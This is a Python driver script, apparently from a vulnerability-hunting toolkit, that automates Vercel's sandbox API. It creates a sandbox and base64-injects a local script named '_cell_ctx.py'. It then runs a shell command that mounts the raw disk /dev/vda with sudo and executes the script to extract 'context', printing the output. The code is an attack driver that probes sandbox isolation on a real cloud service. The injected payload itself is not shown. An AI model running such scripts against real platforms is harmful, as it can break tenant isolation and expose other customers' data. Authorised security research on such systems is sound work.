# -*- coding: utf-8 -*-
"""v64t 驱动: inject _cell_ctx.py 到沙箱执行 (上下文提取)"""
import sys, os, time, json, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

NAME = 'v64t'
CTX = r'D:\scan\_cell_ctx.py'
sid = None


def main():
    global sid
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    time.sleep(2)
    c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, timeout=120)
    print('[create]', c, r[:200])
    if c != 200:
        raise SystemExit('create failed')
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(2)
    src = open(CTX, 'rb').read()
    b64 = base64.b64encode(src).decode()
    inject = "import base64;open('/vercel/sandbox/cc.py','wb').write(base64.b64decode('%s'))" % b64
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "python3", "args": ["-c", inject], "wait": True, "logs": True, "timeout": 60000},
               timeout=90)
    print('[inject]', c)
    time.sleep(1)
    s = 'mkdir -p /mnt/vdax; sudo mount /dev/vda /mnt/vdax 2>&1; python3 /vercel/sandbox/cc.py'
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": 120000},
               timeout=150)
    print('[run]', c)
    print((r or '')[:30000])
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED')


if __name__ == '__main__':
    main()
